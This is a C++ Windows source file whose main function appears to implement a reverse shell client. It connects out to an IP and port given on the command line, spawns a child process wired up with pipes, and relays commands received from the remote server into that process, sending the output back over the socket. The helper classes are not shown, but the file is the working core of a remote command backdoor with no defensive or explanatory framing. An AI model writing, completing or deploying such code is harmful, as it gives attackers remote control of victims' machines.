#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>

#include "Parrent.h"
#include "Client.h"

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 512

int main(int argc, char **argv)
{
	int iResult = 0;
	Parrent p;
	Client c;
	
	if (argc != 3)
	{
		printf("%s <ip> <port>", argv[0]);
		return -1;
	}

	c.Connect(argv[1], argv[2]);
	if (!c.isConnected())
	{
		printf("\nUnable to connect to server!\n");
		WSACleanup();
		return 1;
	}
	
	p.Setup();
	p.CreateChildProcess();
	p.ReadFromPipe();
	while (c.isConnected())
	{
		ZeroMemory(p.text, sizeof(p.text));
		c.receive(p.text);

		p.WriteToPipeWithText();
		p.ReadFromPipe();

		c.Send(p.bufRead);

	}
	c.Shutdown();

	printf("\n\n->End of parent execution.\n");
	return 0;
}